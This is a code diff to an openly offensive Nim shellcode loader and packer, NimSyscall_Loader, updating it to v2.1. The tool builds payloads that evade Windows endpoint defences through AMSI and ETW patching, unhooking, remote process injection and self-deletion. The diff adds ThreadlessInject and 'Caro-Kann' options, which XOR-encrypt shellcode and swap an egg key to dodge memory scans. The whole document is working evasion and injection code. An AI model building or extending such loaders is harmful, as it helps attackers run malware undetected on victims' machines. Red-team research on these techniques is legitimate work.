@@ -16,6 +16,7 @@ import random
 import winim
 #import std/algorithm
 import streams
+#import ptr_math
 when system.hostOS == "windows":
     import winim/clr except `[]`
 
@@ -54,7 +55,7 @@ let banner = """
  / /|  / / / / / / /__/ / /_/ (__  ) /__/ /_/ / / /    / /___/ /_/ / /_/ / /_/ /  __/ /    
 /_/ |_/_/_/ /_/ /_/____/\__, /____/\___/\__,_/_/_/____/_____/\____/\__,_/\__,_/\___/_/     
                        /____/                   /_____/      --> @ShitSecure
-                                                                 v2.0                                            
+                                                                 v2.1                                            
 
 """
 
@@ -63,10 +64,10 @@ echo banner
 #Handle arguments
 
 let helpmenu = """
-NimSyscall_Loader v 2.0
+NimSyscall_Loader v 2.1
 
 Usage:
-  NimSyscall_Loader [--file=file_to_encrypt --key=<key> --output=<output> --large --metadata --shellcodeFile=<shellcodeFile> --shellcodeURL=<shellcodeURL> --dll --dllexportfunc=<exportfuncname> --dllhijack --noNimMain --clone=<dllToClone> --dllProxy --cpl --service --arguments=<Hardcoded_Arguments> --csharp --noAMSI --noETW --noOneShot --PatchAMSI --PatchETW --AMSIProviderPatch --AMSINtCreateSectionHook --sleep=<10> --sleep-in-between=<10> --shellcode --RWX --CallbackExecute --localCreateThread --QueueApc --noWait --COMVARETW --remoteinject --customprocess=<processname> --blockDLLs --spoofArgs=<ArgumentstoSpoof> --parentProcess=<parentName> --remoteprocess=<processnames> --remotepatchAMSI --remotepatchETW --mapSection --unhook --reflective --obfuscate --macPayload --hide --APIhide --noArgs --peinject --peload --hellsgate --syswhispers --jump --sgn --replace --self-delete --sandbox=<check1,check2>, --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --verbose --noDInvoke --x86 --wow64 --llvm --sign --signdomain=<exampledomain> --noAntidebug --noDefaultSandBox --sleepycrypt --fluctuate --interactivePS --psout --psobfs --pslyrics --sourceonly --jmpEntry --jmpEntryDLL=<example.dll> --jmpEntryFunc=<exampleFunc> --dripallocate --dripsleep=<sleeptime-ms> --stegofile=<filepath> --ruy-lopez]
+  NimSyscall_Loader [--file=file_to_encrypt --key=<key> --output=<output> --large --metadata --shellcodeFile=<shellcodeFile> --shellcodeURL=<shellcodeURL> --dll --dllexportfunc=<exportfuncname> --dllhijack --noNimMain --clone=<dllToClone> --dllProxy --cpl --service --arguments=<Hardcoded_Arguments> --csharp --noAMSI --noETW --noOneShot --PatchAMSI --PatchETW --AMSIProviderPatch --AMSINtCreateSectionHook --sleep=<10> --sleep-in-between=<10> --shellcode --RWX --CallbackExecute --localCreateThread --QueueApc --noWait --COMVARETW --remoteinject --customprocess=<processname> --blockDLLs --spoofArgs=<ArgumentstoSpoof> --parentProcess=<parentName> --remoteprocess=<processnames> --remotepatchAMSI --remotepatchETW --mapSection --unhook --reflective --obfuscate --macPayload --hide --APIhide --noArgs --peinject --peload --hellsgate --syswhispers --jump --sgn --replace --self-delete --sandbox=<check1,check2>, --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --verbose --noDInvoke --x86 --wow64 --llvm --sign --signdomain=<exampledomain> --noAntidebug --noDefaultSandBox --sleepycrypt --fluctuate --interactivePS --psout --psobfs --pslyrics --sourceonly --jmpEntry --jmpEntryDLL=<example.dll> --jmpEntryFunc=<exampleFunc> --dripallocate --dripsleep=<sleeptime-ms> --stegofile=<filepath> --ruy-lopez --threadless --threadlessDll=<dllname.dll> --threadlessFunc=<dllfunc> --Caro-Kann]
   NimSyscall_Loader (-h | --help)
   NimSyscall_Loader --version
 
@@ -183,6 +184,10 @@ Options:
       --blockDLLs    Set the DllBlocklistPolicy to 1 to prevent DLLs from being loaded
       --remotepatchAMSI    Patch AMSI in the remote process before shellcode execution
       --remotepatchETW    Patch ETW in the remote process before shellcode execution
+  --threadless    Use Threadless inject for shellcode execution (https://github.com/CCob/ThreadlessInject)
+      --threadlessDll dllname    Specify a DLL to use for the Threadless inject hook
+      --threadlessFunc dllfunc    Specify a function to use for the Threadless inject hook
+  --Caro-Kann    Use Caro-Kann technique to bypass initial memory scan detections by injecting a second shellcode which sleeps and decrypts (https://github.com/S3cur3Th1sSh1t/Caro-Kann)  
 
 [PE Packing]
 
@@ -314,8 +319,13 @@ var
     jmpEntryDLL: string = "ntdll.dll"
     jmpEntryFunction: string = "RtlpWow64CtxFromAmd64"
     dripallocate: bool = false
+    threadless: bool = false
+    threadlessDll: string = "ntdll.dll"
+    threadlessFunc: string = "NtWaitForMultipleObjects" # called regularly by RuntimeBroker.exe which is default spawn inject target.
+    suspended: bool = true
+    carokann: bool = false
 
-let args = docopt(helpmenu, version = "NimSyscall_Loader 2.0")
+let args = docopt(helpmenu, version = "NimSyscall_Loader 2.1")
 
 if args["--file"]:
   let fname = args["--file"]
@@ -668,6 +678,24 @@ if args["--service"]:
 if args["--noDInvoke"]:
   noDInvoke = true
 
+if args["--threadless"]:
+    threadless = true
+    localCreateThread = false
+    useQueueAPC = false
+    callbackexecute = false
+    suspended = false
+
+if args["--threadlessDll"]:
+    let threadlessDllarg = args["--threadlessDll"]
+    threadlessDll = fmt"{threadlessDllarg}"
+
+if args["--threadlessFunc"]:
+    let threadlessFuncarg = args["--threadlessFunc"]
+    threadlessFunc = fmt"{threadlessFuncarg}"
+
+if args["--Caro-Kann"]:
+    carokann = true
+
 var blob: string
 
 if ((compileX86 or wow64) and hellsgate):
@@ -738,6 +766,66 @@ if ((remoteinject == false) and ruylopez):
     echo "Error: Ruy-Lopez can currently only be used in combination with --remoteinject"
     quit(1)
 
+# JmpEntry and Threadless cannot be used in combination, as JmpEntry creates a thread and Threadless has the goal of avoiding thread creation
+if (jmpEntry and threadless):
+    echo "Error: Cannot use both --jmpEntry and --threadless, as JmpEntry creates a thread and Threadless has the goal of avoiding thread creation"
+    quit(1)
+
+# same for queuapc and localcreatethread
+if ((useQueueAPC or localCreateThread or callbackexecute) and threadless):
+    echo "Error: Cannot (--QueueApc/--localCreateThread/-CallbackExecute) with --threadless!"
+    quit(1)
+
+# carokann can only be used in combination with CallbackExecute, localCreateThread or useQueueAPC when not injecting into a remote process
+if (((remoteinject == false) and carokann and (useQueueAPC == false and localCreateThread == false and callbackexecute == false))):
+    echo "Error: Cannot use --Caro-Kann without --QueueApc/--localCreateThread/-CallbackExecute when doing local injection! For some reason NtProtectVirtualMemory fails when using a direct pointer."
+    echo "But this is not a problem at all, because the shellcode will be encrypted at the time of the execute primitive ;-)"
+    quit(1)
+
+# InteractivePS cannot be used with --dll
+if (interactivePS and dll_out):
+    echo "Error: Cannot use --interactivePS with --dll!"
+    quit(1)
+
+# InteractivePS cannot be used with --remoteinject
+if (interactivePS and remoteinject):
+    echo "Error: Cannot use --interactivePS with --remoteinject!"
+    quit(1)
+
+# Cannot use DripAllocate or JmpEntry with Caro-Kann
+if ((carokann and dripallocate) or (carokann and jmpEntry)):
+    echo "Error: Cannot use --Caro-Kann with --dripallocate or --jmpEntry (yet)!"
+    quit(1)
+
+# it makes no sense to use csharp and shellcode at the same time
+if (csharp and shellcode):
+    echo "Error: Using --csharp and --shellcode at the same time makes no sense! Read what the options do!"
+    quit(1)
+
+# it makes no sense to use csharp and peload at the same time
+if (csharp and peload):
+    echo "Error: Using --csharp and --peload at the same time makes no sense! Read what the options do!"
+    quit(1)
+
+# it makes no sense to use peload and shellcode at the same time
+if (peload and shellcode):
+    echo "Error: Using --peload and --shellcode at the same time makes no sense! Read what the options do!"
+    quit(1)
+
+# DripAllocate, CallbackExecute, localCreateThread, QueueApc, MapSection, Caro-Kann are shellcode specific. They cannot be used in combination with csharp, interactivePS or peload
+if((csharp or interactivePS) and (dripallocate or callbackexecute or localCreateThread or useQueueAPC or remoteMapSection or carokann or ruylopez)):
+    echo "Error: Cannot use --csharp/--interactivePS with --dripallocate/--CallbackExecute/--localCreateThread/--QueueApc/--mapSection/--Caro-Kann!"
+    echo "This is Shellcode specific options."
+    quit(1)
+if (peload and (dripallocate or remoteMapSection or carokann)):
+    echo "Error: Cannot use --peload with --dripallocate/--mapSection/--Caro-Kann!"
+    quit(1)
+
+# ThreadlessInject and Caro-Kann cannot yet be used with syswhispers
+if (syswhispers and (threadless or carokann)):
+    echo "Error: Cannot use --syswhispers with --threadless/--Caro-Kann (yet)!"
+    quit(1)
+
 #echo "Key: " & envkey
 # Lets save the last 4 characters of the string in a new variable
 var lastTwo = envkey[^2..^1]
@@ -772,6 +860,7 @@ if (peload or peinject):
     if magic_string != "MZ":
         echo "[-] No Magic bytes found, file is not a PE"
         quit(1)
+
 when system.hostOS == "windows":
     if (csharp):
         if (interactivePS):
@@ -808,9 +897,6 @@ else:
         var newPath = packerPath & "/pwnPowershell/RunSpace.exe"
         blob = readFile(newPath)
 
-#if (AMSICreateSectionHook):
-#    echo "Not fully working yet, sorry!"
-    #quit(0)
 
 #Read file and if PE convert to shellcode before
 if (peinject):
@@ -868,6 +954,83 @@ var
     ectx: ECB[aes256]
     key: array[aes256.sizeKey, byte]
 
+proc toString(bytes: openarray[byte]): string =
+    result = newString(bytes.len)
+    copyMem(result[0].addr, bytes[0].unsafeAddr, bytes.len)
+
+#[
+proc xorFunc*(buf: ptr uint32; bufSize: size_t; xorKey: uint32) =
+  var buf32: ptr uint32 = cast[ptr uint32](buf)
+  var bufSizeRounded: auto = (bufSize - (bufSize mod size_t(sizeof((uint32))))) div 4
+  var i: size_t = 0
+  while i < bufSizeRounded:
+    buf32[] = buf32[] xor xorKey
+    buf32 = buf32 + 1
+    inc(i)
+]#
+
+var originalScLength: int = data.len
+
+if(carokann):
+    # The Caro-Kann shellcode decryptprotect.bin contains an egg with the xor decryption key, which looks like this
+    # 0x14, 0xFF, 0x13, 0xDE | we want to search for this egg and replace it with a random different key.
+    # The egg is 4 bytes long, so we need to generate a random 4 byte key
+    
+    const hookShellcode = slurp"decryptprotect.bin"
+    var hookShellcodeBytes: seq[byte] = toByteSeq(hookShellcode)
+
+    var randomKey = newSeq[byte](4)
+    for i in 0 .. 3:
+        randomKey[i] = byte(rand(int(0x00) .. int(0xFF)))
+    
+    # put the bytes byte 0xAC, 0xF4, 0x0F, 0x96 into the randomKey sequence
+    #randomKey[0] = 0xAC
+    #randomKey[1] = 0xF4
+    #randomKey[2] = 0x0F
+    #randomKey[3] = 0x96 # only for testing purposes
+
+    # Now we need to search for the egg and replace it with the random key. The resulting shellcode will be written to disk as decryptprotect.bin.tmp
+    var eggIndex = 0
+    for i in 0 ..< hookShellcodeBytes.len:
+        if (hookShellcodeBytes[i] == 0x14 and hookShellcodeBytes[i+1] == 0xFF and hookShellcodeBytes[i+2] == 0x13 and hookShellcodeBytes[i+3] == 0xDE):
+            eggIndex = i
+            break
+    
+    echo "Found egg for the Caro-Kann shellcode key at index: " & $eggIndex
+    echo "\r\nReplacing egg with random key: " & $randomKey & "\r\n"
+    hookShellcodeBytes[eggIndex] = randomKey[0]
+    hookShellcodeBytes[eggIndex+1] = randomKey[1]
+    hookShellcodeBytes[eggIndex+2] = randomKey[2]
+    hookShellcodeBytes[eggIndex+3] = randomKey[3]
+
+    writeFile("decryptprotect.bin.tmp", toString(hookShellcodeBytes))
+
+    for i in 0 ..< data.len:
+        # check if data.len is divisible by 4, if not, we need to do the last 3 bytes with the first byte of the key. Thats what the c shellcode function does as well.
+        var isDivisible: bool = false
+        var rest: int = data.len mod 4
+        if (data.len mod 4 == 0):
+            isDivisible = true
+        #echo "Rest: " & $rest & "\r\n"
+        #echo "Data len: " & $data.len & "\r\n"
+        if(isDivisible):
+            data[i] = data[i] xor (randomKey[i mod 4])
+            #echo "Encrypting with Key byte: " & toHex(randomKey[i mod 4]) & " at index: " & $i & "\r\n"
+        else:
+            if (i < data.len - rest):
+                data[i] = data[i] xor (randomKey[i mod 4])
+                #echo "Encrypting with Key byte: " & toHex(randomKey[i mod 4]) & " at index: " & $i & "\r\n"
+            else:
+                data[i] = data[i] xor (randomKey[0] and 0xFF)
+                #echo "Encrypting with Key byte: " & toHex(randomKey[0]) & " at index: " & $i & "\r\n"
+    
+    
+    # write new data blob to disk as datablob.bin to verify the encryption went correctly.
+    #writeFile("datablob.bin", toString(data))
+
+
+
+
 # AES256 block size is 128 bits or 16 bytes, so we need to pad plaintext with
 # 0 bytes. Not the best crypto, but to be honest - who tries to break AES256??
 if ((len(data) mod aes256.sizeBlock) != 0):
@@ -919,9 +1082,6 @@ writeFile(shellcodeFile[0], content)
 
 import streams
 
-proc toString(bytes: openarray[byte]): string =
-    result = newString(bytes.len)
-    copyMem(result[0].addr, bytes[0].unsafeAddr, bytes.len)
 
 proc nthBitPresent(b: byte,n: int): bool =
     var a = 1 shl n
@@ -1645,6 +1805,12 @@ when defined(sleep):
     import random
     import times
 
+when defined(threadless):
+    import Utils
+
+when defined(AllocateDripStyle):
+    import Utils
+
 when defined(SelfDelete):
     # Don't want to import the everything from winim, only what's really needed
     from winim import PWCHAR,HANDLE,DELETE,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,WINBOOL,FILE_RENAME_INFO,LPWSTR,DWORD,fileRenameInfo,FILE_DISPOSITION_INFO,TRUE
@@ -1912,6 +2078,12 @@ when defined(Stego):
             shellcode: seq[byte] = extractBytes(c, a)
         return shellcode
 
+when defined(threadless):
+    const threadlessDLL = obf("{threadlessDll}") 
+    const threadlessFunction = obf("{threadlessFunc}")
+
+when defined(carokann):
+    var originalscLength: DWORD = {originalScLength}
 
 when defined(AllocateDripStyle):
     var dripsleepinbetween = {dripsleepinbetween}
@@ -2450,14 +2622,38 @@ let NotepadProcIDStub * = fmt"""
                     sizeof(ppHandle),
                     NULL,
                     NULL)
+        var flags: DWORD = EXTENDED_STARTUPINFO_PRESENT
         
+        when defined(suspended): 
+            flags = flags or CREATE_SUSPENDED
+        #[
+        when defined(threadless): # for some reasson CFG kicks in, when we execute threadlessinject style into a newly spawned process
+            
+            InitializeProcThreadAttributeList(NULL, 2, 0, addr lpSize)
+            si.lpAttributeList = cast[LPPROC_THREAD_ATTRIBUTE_LIST](HeapAlloc(GetProcessHeap(), 0, lpSize))
+            InitializeProcThreadAttributeList(si.lpAttributeList, 2, 0, addr lpSize)
+            var policy: DWORD64
+            const PROCESS_CREATION_MITIGATION_POLICY_EXTENSION_POINT_DISABLE_ALWAYS_OFF = 0x00000002 shl 40
+            policy = PROCESS_CREATION_MITIGATION_POLICY_EXTENSION_POINT_DISABLE_ALWAYS_OFF
+
+        
+            status = UpdateProcThreadAttribute(
+                si.lpAttributeList,
+                0,
+                cast[DWORD_PTR](PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY),
+                addr policy,
+                sizeof(policy),
+                NULL,
+                NULL)
+            ]#
+
         status = CreateProcess(
             NULL,
             cast[LPWSTR](tProcPath),
             ps,
             ts, 
             FALSE,
-            EXTENDED_STARTUPINFO_PRESENT or CREATE_SUSPENDED,
+            flags,
             NULL,
             r"C:\Windows\system32\",
             addr si.StartupInfo,
@@ -2803,6 +2999,9 @@ if(jmpEntry):
 if(dripallocate):
     stub.add(DripAllocateStubFirst)
 
+if(threadless):
+    stub.add(ThreadlessInjectStub)
+
 stub.add(MainStub)
 
 stub.add(getRandStub())
@@ -3133,6 +3332,12 @@ elif (retrieveFromURL):
 else:
     basicCompileFlags.add("-d:PayloadEmbedded ")
 
+if (carokann):
+    basicCompileFlags.add("-d:carokann ")
+
+if(suspended):
+    basicCompileFlags.add("-d:suspended ")
+
 if(dripallocate):
     basicCompileFlags.add("-d:AllocateDripStyle ")
 
@@ -3190,6 +3395,9 @@ if(service):
 
 if(unhook):
     basicCompileFlags.add("-d:unhook ")
+
+if(threadless):
+    basicCompileFlags.add("-d:threadless ")
 
 if(dllProxy):
     when system.hostOS == "windows":
